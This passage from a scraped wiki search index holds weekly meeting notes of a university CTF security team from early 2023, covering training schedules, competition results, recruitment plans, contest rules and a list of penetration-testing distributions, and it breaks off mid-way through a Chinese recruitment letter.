2023-02-15 06:00 False"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-09/#wrap-up","title":"Wrap-up","text":"<p>I'm working on the reproduction environment of Xihulunjian. The progress would update instantly on detroit server port 29998. The upcoming events are listed above.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-16/","title":"CTF Week Meeting 2023-02-16","text":"<p>Welcome back to the university. We are going to have our first training this semester in Feb. 19th. The location is 551 Meeting Room, Southern Tower of Engineering Department. Topics are listed below.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-16/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>COMPASS CTF 2022 - 80%</li> <li>Topic: CTF combined with research - 5%</li> <li>Multi-platform promotion of COMPASS CTF - 20%</li> <li>New Platform GZCTF - 43%</li> <li>Wiki page content adjustment - 20%</li> <li>CTFtime program: play CTF and sharing - 13%</li> <li>New Member Recruitment - 0%</li> <li>Ande Cup CTF game - 13%</li> <li>Remedial content session - 0%</li> <li>2023 spring training schedule - 100%</li> <li>Xihulunjian reproduction environment - 50%</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-16/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>COMPASS CTF 2022 Winners and Prizes.</li> <li>CTF-Related Research Components.</li> <li>2023 Spring Training Schedule.</li> <li>Upcoming events.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-16/#0x1-compass-ctf-2022-winners-and-prizes","title":"0x1. COMPASS CTF 2022 Winners and Prizes","text":"<p>After the CTF, if you are a student in SUSTech, we would have some prizes for top players.</p> <ul> <li>1st: Respberry Pi 4B Keyboard, and other prizes below.</li> <li>2nd-3rd: SSD-USB drive with penetration toolkits, and other prizes below.</li> <li>4th-8th: COMPASS CTF Coat, and COMPASS lab stickers.</li> </ul> <p>And for the top 5 players who haven't been in the CTF team / COMPASS lab, we would glad to invite you to join us.</p> Rank ID Score 1 Cerulime 1373 2 Ben 1225 3 cerium 825 4 Trust_04zh 675 5 nobody 575 6 CharlottE67 350 7 12012430 275 8 yxx 200 <p>The prizes are being customized and will be given to the winners offline before the second week of training.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-16/#0x2-ctf-related-research-components","title":"0x2. CTF-Related Research Components","text":"<p>I will continue to communicate with my colleagues in the COMPASS lab to try to integrate CTF with academic research. Currently, through communication with some CTF players, cryptography is the most closely integrated link between CTF and research. An example of this is the research described below.</p> <p>https://blog.trailofbits.com/2022/11/29/specialized-zero-knowledge-proof-failures/</p> <p>Fuzzing is likewise a relatively hot topic in research, and the following information is relevant.</p> <p>https://blog.trailofbits.com/2022/12/08/hybrid-echidna-fuzzing-optik-maat/</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-16/#0x3-2023-spring-training-schedule","title":"0x3. 2023 Spring Training Schedule","text":"Topic Category Attachment Date Network Sniff: Introduction Web https://ithelp.ithome.com.tw/articles/10245117https://ithelp.ithome.com.tw/articles/10245119https://ithelp.ithome.com.tw/articles/10246315https://ithelp.ithome.com.tw/articles/10246917 Feb. 19th, 2023 Network Sniff: Multi-platform Web https://frida.re/docs/android/ Feb. 26th, 2023 Network Scan Web https://websec.readthedocs.io/zh/latest/index.html March. 5th, 2023 Ethereum and Solidity: Introduction Blockchain http://www.snowywar.top/?p=3848 March. 12th, 2023 Ethereum and Solidity: Practice Blockchain http://www.snowywar.top/?p=3848 March. 19th, 2023 IoT Security IoT https://paper.seebug.org/2048/ March. 26th, 2023 PWN: Stack PWN https://ir0nstone.gitbook.io/notes/ April. 2nd, 2023 PWN: Heap PWN https://ir0nstone.gitbook.io/notes/ April. 9th, 2023 PWN: Kernel PWN https://ir0nstone.gitbook.io/notes/https://paper.seebug.org/2036/ April. 16th, 2023 Reverse Enginnering RE https://0xinfection.github.io/reversing/ April. 23th, 2023 Real-World Cryptography Cryptography https://vitalik.ca/index.html April. 30th, 2023 Real-World Security: Penetration RW https://www.ired.team/ May. 7th, 2023 Real-World Security: Malware RW https://www.ired.team/ May. 14th, 2023 Real-World Security: Summary RW https://www.ired.team/ May. 21st, 2023"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-16/#0x4-upcoming-events","title":"0x4. Upcoming events","text":"<p>This weekend we would participate in the <code>pbctf</code>, which is one of the top events. Another competition is also interesting.</p> Competition Name Link Start Time End Time Require pre-register pbctf 2023 https://ctf.perfect.blue/ 2023-02-18 22:00 2023-02-20 10:00 False HackTM CTF Quals 2023 https://ctf.hacktm.ro/ 2023-02-18 20:00 2023-02-19 20:00 False"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-16/#wrap-up","title":"Wrap-up","text":"<p>The prizes of COMPASS CTF 2022 are being customized and will be given to the winners offline before the second week of training. The time schedule of the training this semester is published.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-23/","title":"CTF Week Meeting 2023-02-23","text":"<p>Good afternoon, everyone. Welcome to this meeting. I hope you are all doing well today. We have a lot to cover, so let's get started. Let's make sure we respect each other's time, opinions, and ideas. Please be concise and stay on topic to ensure that we stay on schedule. And please feel free to ask questions or provide feedback at any time.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-23/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>COMPASS CTF 2022 - 80%</li> <li>Topic: CTF combined with research - 15%</li> <li>Multi-platform promotion of COMPASS CTF - 20%</li> <li>New Platform GZCTF - 43%</li> <li>Wiki page content adjustment - 20%</li> <li>CTFtime program: play CTF and sharing - 14%</li> <li>New Member Recruitment - 10%</li> <li>Ande Cup CTF game - 13%</li> <li>Remedial content session - 0%</li> <li>Xihulunjian reproduction environment - 50%</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-23/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>COMPASS CTF 2022 Winners and Prizes.</li> <li>CTF-Related Research Components.</li> <li>2023 Spring Training Schedule and Adjustments.</li> <li>Upcoming events.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-23/#0x1-compass-ctf-2022-winners-and-prizes","title":"0x1. COMPASS CTF 2022 Winners and Prizes","text":"<p>After the CTF, if you are a student in SUSTech, we would have some prizes for top players.</p> <ul> <li>1st: Respberry Pi 4B Keyboard, and other prizes below.</li> <li>2nd-3rd: SSD-USB drive with penetration toolkits, and other prizes below.</li> <li>4th-8th: COMPASS CTF Coat, and COMPASS lab stickers.</li> </ul> <p>And for the top 5 players who haven't been in the CTF team / COMPASS lab, we would glad to invite you to join us.</p> Rank ID Score 1 Cerulime 1373 2 Ben 1225 3 cerium 825 4 Trust_04zh 675 5 nobody 575 6 CharlottE67 350 7 12012430 275 8 yxx 200 <p>The prizes are being customized and will be given to the winners offline before the second week (next week) of training.</p> <p>I would invite the winners to our training this week and write the order for them prizes. Hope you enjoy this event.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-23/#0x2-ctf-related-research-components","title":"0x2. CTF-Related Research Components","text":"<p>I list 12 ideas here, and I would add a new component in our weekly training for the students who are interested in the paper submitting. The topics are related to the CTF, and popular in the research area.</p> <p>For more details, I need to discover more with COMPASS's outstanding memebers.</p> <ol> <li>Attack surface analysis and vulnerability assessment in Capture the Flag (CTF) games.</li> <li>Security architecture analysis and design in CTF games.</li> <li>Developing CTF games for education and training purposes.</li> <li>Analysis of game mechanics and scoring systems in CTF competitions.</li> <li>Techniques for solving CTF challenges and puzzles.</li> <li>Developing AI-powered tools for CTF competitions.</li> <li>.Analysis of emerging attack techniques in CTF competitions.</li> <li>Development and use of automated tools for CTF game exploitation and defense.</li> <li>CTF game analysis for security research and threat modeling.</li> <li>Analysis of the impact of CTF games on cyber awareness and skill development in organizations.</li> <li>Analyzing the difficulty and complexity of CTF challenges and developing metrics to measure them.</li> <li>Security analysis of existing CTF platforms and frameworks.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-23/#0x3-2023-spring-training-schedule","title":"0x3. 2023 Spring Training Schedule","text":"Topic Category Attachment Date Network Sniff: Introduction Web https://ithelp.ithome.com.tw/articles/10245117 https://ithelp.ithome.com.tw/articles/10245119 https://ithelp.ithome.com.tw/articles/10246315 https://ithelp.ithome.com.tw/articles/10246917 Feb. 26th, 2023 Network Sniff: Multi-platform Web https://frida.re/docs/android/ March. 5th, 2023 Network Scan Web https://websec.readthedocs.io/zh/latest/index.html March. 12th, 2023 Ethereum and Solidity: Introduction Blockchain http://www.snowywar.top/?p=3848 March. 19th, 2023 Ethereum and Solidity: Practice Blockchain http://www.snowywar.top/?p=3848 March. 26th, 2023 IoT Security IoT https://paper.seebug.org/2048/ April. 2nd, 2023 PWN: Stack PWN https://ir0nstone.gitbook.io/notes/ April. 9th, 2023 PWN: Heap PWN https://ir0nstone.gitbook.io/notes/ April. 16th, 2023 PWN: Kernel PWN https://ir0nstone.gitbook.io/notes/ https://paper.seebug.org/2036/ April. 23th, 2023 Reverse Enginnering RE https://0xinfection.github.io/reversing/ April. 30th, 2023 Real-World Cryptography Cryptography https://vitalik.ca/index.html May. 7th, 2023 Real-World Security: Penetration RW https://www.ired.team/ May. 14th, 2023 Real-World Security: Malware RW https://www.ired.team/ May. 21st, 2023 Real-World Security: Summary RW https://www.ired.team/ May. 28th, 2023"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-23/#0x4-upcoming-events","title":"0x4. Upcoming events","text":"Competition Name Link Start Time End Time Require pre-register Cyber-Bytes 2023 https://www.jurhythm.in/#services 2023-02-25 19:00 2023-02-26 00:00 False Trellix HAX 2023 https://hax.trellix.com/ 2023-02-25 16:00 2023-03-11 16:00 False VU CYBERTHON 2023 https://www.cyberthon.lt/ 2023-02-25 15:00 2023-02-26 03:00 False <p>A new summary about the research topics would be put after the training, for your academic purpose.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-23/#wrap-up","title":"Wrap-up","text":"<p>I've talked about the COMPASS CTF 2022 Winners and Prizes, and invite the winners to our weekly meetings this week. Hope to see you this Sunday. For the research topics, I found more than 20 papers and selected 12 ideas about the CTF research, hope this can help you. Don't forget to join our weekly meeting this Sunday at 551 Meeting Room.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-02/","title":"CTF Week Meeting 2023-03-02","text":"<p>Glad to have a new student who is interested in the CTF, I've talked with him a little bit. Let's start our meeting this week. Don't forget we would have our training this Sunday normally.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-02/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>COMPASS CTF 2022 - 85%</li> <li>Topic: CTF combined with research - 20%</li> <li>Multi-platform promotion of COMPASS CTF - 20%</li> <li>New Platform GZCTF - 55%</li> <li>Wiki page content adjustment - 20%</li> <li>CTFtime program: play CTF and share - 17%</li> <li>New Member Recruitment - 20%</li> <li>Ande Cup CTF game - 13%</li> <li>Remedial content session - 0%</li> <li>Xihulunjian reproduction environment - 50%</li> <li>CTF from Practice to Principle - 3%</li> <li>National College Student Information Security Contest - 10%</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-02/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>Topic: CTF combined with research.</li> <li>New Platform GZCTF.</li> <li>New Member Recruitment.</li> <li>CTF from Practice to Principle.</li> <li>National College Student Information Security Contest.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-02/#0x1-topic-ctf-combined-with-research","title":"0x1. Topic: CTF combined with research","text":"<p>Discuss later after the meeting.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-02/#0x2-new-platform-gzctf","title":"0x2. New Platform GZCTF","text":"<p>The migration and backup of most of the original titles have been completed and are being deployed to the new platform. Discussion item 1: the type of topics migrated and the positioning of the GZCTF platform.</p> <p>Positioning of the new platform: used for topic reproduction environment (official environment has ended maintenance) and deployment and distribution of original topics. It can also be used for internal competition activities, competition, and new member recruitment.</p> <p>Topic migration scope.</p> <ol> <li>the official platform has been closed to the reproduction of the topic.</li> <li>Deployment of COMPASS CTF self-assigned questions and CS315 original questions.</li> <li>CTF team for new member recruitment.</li> </ol> <p>The retention of the old account will be discussed this week, whether to retain the original account data or to carry out a new account system. Discussion Item 2: Account data migration will be conducted.</p> <ol> <li>The old account and score information will not be retained (due to the reorganization and redesign of the score of the questions).</li> <li>If you want to archive your account data, we can do it manually.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-02/#0x3-new-member-recruitment","title":"0x3. New Member Recruitment","text":"<p>A new approach to recruiting new members this semester will be used to address the issue of basic content training taking time away from training for active members. At one time, when we did new member recruitment, we would embark on 2-3 weeks of basic content training, and it would be difficult for advanced-level members to learn anything new during that portion of time.</p> <p></p> <p>Therefore, this semester's recruitment will be in the form of catechism/materials + offline advanced training. I will migrate the basic content training online, and invite the whole school to attend a 3-week basic content training and lecture, after which a recruitment/in-school competition will be held to decide on new members.</p> <p>The number of new members recruited this semester will be about 5.</p> <p>Basic content training will be posted on a wiki and linked to online archiving platforms (e.g. social accounts or catechism sites), and sections on basic content include.</p> <ol> <li>introduction to CTF basic content and future directions.</li> <li>the spirit of network security and how to search for information.</li> <li>how to install and use Linux systems.</li> <li>basic program development using Python.</li> <li>Data forensics and information steganography.</li> <li>Data encoding and cryptographic security.</li> <li>Network attack and defense and website penetration testing.</li> <li>Assembly code basics and reverse engineering.</li> <li>Binary Security Fundamentals.</li> </ol> <p>Additional information on the foundation content is provided in part as follows.</p> <ol> <li>Introduction to HTML/CSS/JavaScript basics.</li> <li>PHP code fundamentals.</li> <li>Program debugging using GDB and plug-ins.</li> <li>Docker containers and Kubernetes for container management.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-02/#0x4-ctf-from-practice-to-principle","title":"0x4. CTF from Practice to Principle","text":"<p>The idea to write the book \"CTF: From Practice to Principle\" is inspired by my professor Fengwei, Zhang. From all of my personal experience with the CTF challenges and the events, there's always a huge gap between the beginner layer introduction to the advanced layer expert. When I start to step out of the beginner layer, it's very difficult to understand how and why some advanced knowledge.</p> <p>Under the thought of this aspect of the difficulty, I want to introduce those things you won't know when first solved some challenges. Each chapter of the book would start with some practice knowledge, and end with some difficult advanced principles. The whole book would be divided into two parts: basic knowledge that you can learn from simply reading and learning some limited necessary knowledge, and the hard part is that you need to read more about the principle, source code, and the details of the techniques.</p> <p>Being restricted by my skills, some parts of the book would refer to online websites, technical books, and research papers. I would carefully note the reference when I use them, and if that reference has violated the terms of usage, please contact me and I would delete those parts immediately. Besides, related apologies and compensation would be discussed.</p> <p>**Example reference format: **</p> <p>One of the common tools for web directory scanning is <code>dirbuster</code>[1]. According to ...</p> <p>[1] dirbuster: https://www.kali.org/tools/dirbuster/ Kali dirbuster description page, https://gitlab.com/kalilinux/packages/dirbuster GitLab dirbuster source code page</p> <p>The writing of the book is done by my limited experience and the architecture of knowledge. The mistakes and the errors are not avoidable. If you find any of them, please feel free to contact me, very glad to have your advice. By the way, I would like to send some presents (stickers, T-shirts, or other little things) in return. Luckily, we have an online page to host the book during my writing progress. It's also fine to use GitHub's pull request to correct any mistake.</p> <p>Enough for the book writing, now let's talk about the structure of the book in the next chapter.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-02/#0x5-national-college-student-information-security-contest","title":"0x5. National College Student Information Security Contest","text":"<p>The National Student Information Security Competition is a large-scale network security competition recognized by the Ministry of Education and co-organized by the Office of the Leading Group of Network Security and Informatization of the CPC Central Committee, the National Information Security Engineering and Technology Research Center, the China Internet Development Foundation, and the China Information Security Certification Center, which has been held for fifteen years so far, including Peking University, Tsinghua University, Beijing Institute of Electronic Science and Technology Beijing University of Aeronautics and Astronautics, Renmin University of China, and Fudan University all conduct special training and participation for this purpose.</p> <p>The competition will be held in two tracks: the \"Works Competition\" and the \"Innovation and Practice Competition\". I will introduce them separately and use the 15th National Student Information Security Competition as an example to help you schedule.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-02/#the-15th-national-university-student-information-security-competition-information-security-works-competition","title":"The 15th National University Student Information Security Competition Information Security Works Competition","text":"<p>Reference link: http://117.78.33.202/competition/securityCompetition?compet_id=35</p> <p>I. Contents of this competition</p> <ol> <li>Information Security Competition</li> </ol> <p>The information security works competition adopts open-ended and self-designed questions, and participants must complete the works and submit them online before the deadline. The content requirements of the entries are in accordance with the relevant provisions in the Charter of the National University Student Information Security Competition and the Entry Guide of the 2022 National University Student Information Security Competition-Works Competition (which will be published through the official website of the competition at http://www.ciscn.cn/\u516c\u5e03 after the opening of the competition).</p> <ol> <li>Network Security Talent Innovation and Entrepreneurship Development Forum</li> </ol> <p>The Security Forum contains several thematic sections, focusing on current trends and technical hotspots of the network security industry, discussing the cultivation of network security talents and innovation and entrepreneurship of college students, and carrying out colorful keynote speeches and all-around interaction.</p> <p>II. the object of participation</p> <p>Participants are full-time college students with official school registration nationwide. Students can form their own teams, and each team should have no more than 4 students (including a team leader). Each team is limited to one designated instructor and each student is limited to one team. The number of teams from each university is not limited and cross-college teams are not allowed.</p> <p>The Forum on Innovation and Entrepreneurship Development of Network Security Talents held during the final of the Information Security Competition will be open to teachers and students, enterprises, and individuals from universities nationwide.</p> <p>III. Participation Method</p> <p>According to the requirements of the Statute of the National University Students' Information Security Competition and the Participation Guide of the 2022 National University Students' Information Security Competition - Works Competition, please refer to the website of the competition for details.</p> <p>IV. Timetable</p> Activities Activity Phase Schedule Information Security Competition. Registration and pre-tournament counseling. April 25-June 13. Information Security Competition. Online submission of entries. April 30-June 15. Information Security Competition. Preliminary List Announcement. June 18. Information Security Competition. Online preliminary evaluation. June 25 - July 25. Information Security Competition. Finalists announced. July 31. Information Security Competition. Final evaluation meeting. August 19 registration, August 20 - August 21 competition. Information Security Competition. Award ceremony. August 22nd. Network Security Talent Forum. Call for topics and invitation of experts. April 25 - July 31. Network Security Talent Forum. Main Forum. August 22nd. <p>V. Registration Instructions</p> <ol> <li> <p>The online registration period for the Information Security Competition starts and ends on April 25, 2022, to June 13, 2022, at 24:00.</p> </li> <li> <p>After receiving the notification, each university should designate one teacher as the contact person (the contact person must be the university leader) before June 1, responsible for the matters related to the competition of the university, and download the \"university contact teacher registration form\" (see Annex 1) on the competition website, fill in the teacher's information as required and send it to the organizing committee via email Secretariat (including the electronic version and the scanned copy of the paper version with seal).</p> </li> <li> <p>The organizing committee will finish the qualification examination for the information security works competition on June 18 and announce the list of participants of the information security works competition. Before June 25, the contact person of each university shall summarize the \"Summary Form of University Teams\" (see Annex 2, downloaded from the competition website) and send it to the secretariat of the Organizing Committee via email (including electronic version and scanned copy of the sealed paper version). Teams participating in the Information Security Competition are required to pay the participation fee ($200 per team).</p> </li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-02/#the-15th-national-student-information-security-competition-innovation-and-practical-ability-competition","title":"The 15th National Student Information Security Competition Innovation and Practical Ability Competition","text":"<p>I. Competition Organization Form</p> <p>The competition is organized in four stages: online registration and team formation, online preliminary selection, zonal competition, and national finals. There are eight regions in China, and teams from universities in each region will advance to the national finals through the regional competition.</p> <p>For more details and specific arrangements, please refer to the \"15th National Student Competition on Information Security - Innovation and Practical Ability Competition Regulations\", which will be announced through the official website of the competition (http://www.ciscn.cn/) after the competition starts.</p> <p>II. Target Participants and Requirements</p> <p>The target participants shall be full-time students (including senior high school, undergraduate and postgraduate students) with regular school registration in higher education institutions (undergraduate and senior high school institutions) nationwide, and the specific requirements are as follows</p> <p>(1) The maximum number of participants in each team shall not exceed 4, the number of teams in each university shall not be limited, and no cross-college teams shall be allowed.</p> <p>(2) Each person can only participate in one team (i.e. no team can be formed with others after individual participation, or no other team after individual participation in one team), and one instructor is allowed.</p> <p>(3) The campuses of universities distributed in different cities are regarded as different universities, and each campus can form teams to participate and be shortlisted for the divisional finals of their divisions, as well as the finals stage.</p> <p>(4) Instructors must be teachers in service at the universities where the teams are located. (3) Instructors can guide students in team formation and knowledge and skill training, but on-site participation must be done independently by participating students.</p> <p>(6) The instructors are responsible for managing and guiding the participating student teams throughout the whole process, and the participation process must not violate the competition rules, attack the competition platform, system, and third-party services, or violate national laws, regulations, and public order and morals (such as team names, etc.); the organizing committee will select excellent instructors (instructors of the teams that won the national first prize and innovation single award) and give them recognition.</p> <p>III. Competition schedule</p> Activities Activity Phase Schedule Innovation Practice Competency Competition. Registration and coaching. April 29-May 20. Innovation Practice Competency Competition. Announcement of the preliminary competition list. Around May 24th. Innovation Practice Competency Competition. Online preliminary rounds. May 28-29. Innovation Practice Competency Competition. The divisional list was announced. June 3. Innovation Practice Competency Competition. Divisional competition time. June 6-20. Innovation Practice Competency Competition. The finals list announced. July 1. Innovation Practice Competency Competition. The Finals. August 6-7. <p>IV. Other matters</p> <ol> <li> <p>Important notices and instructions about this competition will be announced and notified by the organizing committee through the competition's official website and official QQ group.</p> </li> <li> <p>The organizing committee will conscientiously implement the important speeches and instructions of General Secretary Xi Jinping on epidemic prevention and control, and if the situation of epidemic prevention and control of the new crown changes, the competition format, competition time, or content of the competition activities will be adjusted in accordance with the national and superior requirements in a timely manner. The details will be announced and notified through the competition website and official QQ group in a timely manner.</p> </li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-02/#wrap-up","title":"Wrap-up","text":"<p>We've talked about the AEG research idea about CTF this week. About the GZCTF, we've decided on the challenge categories and the data transmission rule. The new member recruiting project is ongoing, thanks for the advice for our poster. A book named \"CTF From Practice to Principle\" is now writing in order to give a brief idea to beginners in the CTF. At last, be sure you are prepared for the \"National College Information Security Competition\" as a COMPASS team.</p> <p>Looking forward to seeing you on Sunday.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/","title":"CTF Week Meeting 2023-03-09","text":"<p>In the first few weeks of the school year, our offline training is on schedule and we have recently been working on the training content with our Hunan University students. The recruitment program is also underway and more new students will be joining us soon. We still want to thank COMPASS Lab for the great support and hope that students will join COMPASS Lab in an excellent environment for innovative experiments and graduate students' choices.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>COMPASS CTF 2022 - 90%</li> <li>Topic: CTF combined with research - 20%</li> <li>Multi-platform promotion of COMPASS CTF - 20%</li> <li>New Platform GZCTF - 55%</li> <li>Wiki page content adjustment - 60%</li> <li>CTFtime program: play CTF and share - 19%</li> <li>New Member Recruitment - 37.5%</li> <li>Ande Cup CTF game - 13%</li> <li>Remedial content session - 33% <li>CTF from Practice to Principle - 3%</li> <li>National College Student Information Security Contest - 10%</li>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>COMPASS CTF 2022.</li> <li>Wiki page content adjustment.</li> <li>New Member Recruitment.</li> <li>Upcoming Events.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#0x1-compass-ctf-2022","title":"0x1. COMPASS CTF 2022","text":"<p>All of our prizes have been customized and we are about to complete the final awarding part of this competition.</p> <p></p> <p>I hope everyone learned and made progress in this competition. Most importantly, I hope all the participants enjoyed the competition!</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#0x2-wiki-page-content-adjustment","title":"0x2. Wiki page content adjustment","text":"<p>I'm updating the wiki's toolkit directory, uploading all the tools I've used recently, and merging several toolset sites for inclusion. For beginners, you can use the toolset directly to build your environment quickly.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#windows10-penetration-suite-toolkit-within-kali-linux","title":"Windows10 Penetration Suite Toolkit within Kali Linux","text":""},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#system-description","title":"System Description","text":"<p>Based on the original Win10 Workstation 21H2 x64 image (not available for ARM devices).</p> <p>Complete installation of WSL Kali Linux 2022.3.</p> <p>streamline the software that comes with the system, beautify the fonts and some icons, and moderate optimization.</p> <p>using single-disk file storage to improve performance.</p> <p>Recommended runtime environment:</p> <ul> <li>vmware:16.x (VMware graphics memory 1G)</li> <li>Running memory:8G</li> <li>Solid State Drive:200G</li> </ul>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#links","title":"Links","text":"<p>https://github.com/makoto56/penetration-suite-toolkit</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#kali-linux","title":"Kali Linux","text":"<p>The most advanced Penetration Testing Distribution</p> <p>Kali Linux is an open-source, Debian-based Linux distribution geared towards various information security tasks, such as Penetration Testing, Security Research, Computer Forensics, and Reverse Engineering.</p> <p>The Kali Linux penetration testing platform contains a vast array of tools and utilities. From information gathering to final reporting, Kali Linux enables security and IT professionals to assess the security of their systems.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#links_1","title":"Links","text":"<p>https://www.kali.org/</p> <p>https://www.kali.org/tools</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#black-arch-linux","title":"Black Arch Linux","text":""},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#about","title":"About","text":"<p>BlackArch Linux is an Arch Linux-based penetration testing distribution for penetration testers and security researchers. The repository contains 2840 tools. You can install tools individually or in groups. BlackArch Linux is compatible with existing Arch installs. For more information, see the installation instructions. Also, news is published on our blog.</p> <p>Please note that BlackArch is a relatively new project. To report bugs and request new tools, please visit the issue tracker on Github, stop by Matrix, or email us.</p> <p>The BlackArch Full ISO contains multiple window managers. The BlackArch Slim ISO features the XFCE Desktop Environment. Below you will find screenshots of a few of them.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#links_2","title":"Links","text":"<p>https://blackarch.org/</p> <p>In addition, the tutorial section of the basic content has been uploaded to the wiki page, and you can now view the basic training section which is being updated, and later I will also update our new topic practice and tournament contact page to the home page.</p> <p>https://wiki.compass.college/CTF/CTF%20and%20Hacker%20Attitude/</p> <p>https://wiki.compass.college/CTF/Linux%20Basics/</p> <p>https://wiki.compass.college/CTF/Python_1/</p> <p>https://wiki.compass.college/CTF/Python_2/</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#0x3-new-member-recruitment","title":"0x3. New Member Recruitment","text":"<p>\u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u6280\u672f\u7cfbCOMPASS\u5b9e\u9a8c\u5ba4\u6709\u5173\u8ba1\u7b97\u673a\u5b89\u5168\u4e0e\u7f51\u7edc\u5b89\u5168\u57f9\u8bad\u7684\u9080\u8bf7\u51fd</p> <p>\u540c\u5b66\u4eec\u597d\uff0c</p> <p>\u4e3a\u79ef\u6781\u54cd\u5e94\u56fd\u5bb6\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u4eba\u624d\u6218\u7565\uff0c\u52a0\u5feb\u653b\u9632\u517c\u5907\u521b\u65b0\u4eba\u624d\u57f9\u517b\u6b65\u4f10\uff0c\u63d0\u5347\u5b66\u751f\u653b\u9632\u517c\u5907\u7684\u7f51\u7edc\u521b\u65b0\u5b9e\u8df5\u80fd\u529b\uff0c\u57f9\u517b\u5b66\u751f\u7684\u521b\u65b0\u610f\u8bc6\u4e0e\u56e2\u961f\u5408\u4f5c\u7cbe\u795e\uff0c\u666e\u53ca\u4fe1\u606f\u5b89\u5168\u77e5\u8bc6\uff0c\u589e\u5f3a\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u610f\u8bc6\uff0c\u63d0\u9ad8\u5b66\u751f\u7684\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u521b\u65b0\u80fd\u529b\u4e0e\u5b9e\u8df5\u6280\u80fd\uff0c\u63a8\u52a8\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u751f\u6001\u4f53\u7cfb\u7684\u4eba\u624d\u57f9\u517b\u548c\u4ea7\u5b66\u7814\u7528\uff0c\u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u6280\u672f\u7cfb\u8ba1\u7b97\u673a\u7cfb\u7edf\u5b89\u5168\u5b9e\u9a8c\u5ba4\uff08COMPASS lab\uff09\u4e0e\u7f51\u7edc\u5b89\u5168\u7ade\u8d5b\u6821\u961f\uff08COMPASS CTF\uff09\u9080\u8bf7\u540c\u5b66\u4eec\u53c2\u52a0\u672c\u79d1\u751f\u8ba1\u7b97\u673a\u5b89\u5168\u57fa\u7840\u6280\u80fd\u57f9\u8bad\u66a8\u7f51\u7edc\u5b89\u5168\u961f\u4f0d\u6210\u5458\u62db\u52df\u6d3b\u52a8\u3002</p> <p>\u8ba1\u7b97\u673a\u5b89\u5168\u57fa\u7840\u6280\u80fd\u57f9\u8bad\u5c06\u5728\u7ebf\u4e0a\u8fdb\u884c\uff0c\u5185\u5bb9\u5305\u62ec\uff1a  \\1. \u4ec0\u4e48\u662f\u7f51\u7edc\u5b89\u5168\u4e0e\u9ed1\u5ba2\u7cbe\u795e\uff1b</p> <p>\\2. Linux\u7cfbOS\u7684\u5b89\u88c5\u4e0e\u4f7f\u7528\uff1b</p> <p>\\3. Python\u7f16\u7a0b\u57fa\u7840\uff1a\u6570\u5b66\u3001\u7f51\u7edc\u3001\u4e0e\u56fe\u50cf\u5904\u7406\uff1b</p> <p>\\4. \u5bc6\u7801\u5b66\u57fa\u7840\u4e0eSagemath\u6559\u5b66\uff1b</p> <p>\\5. \u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u4e0eBurp Suite\u5206\u6790\u7f51\u7edc\u5305\uff1b</p> <p>\\6. \u6587\u4ef6\u683c\u5f0f\u6559\u7a0b\u4e0e\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\uff1b</p> <p>\\7. IDA\u8fdb\u884cELF/PE\u53ef\u6267\u884c\u6587\u4ef6\u9006\u5411\u5de5\u7a0b\uff1b</p> <p>\\8. 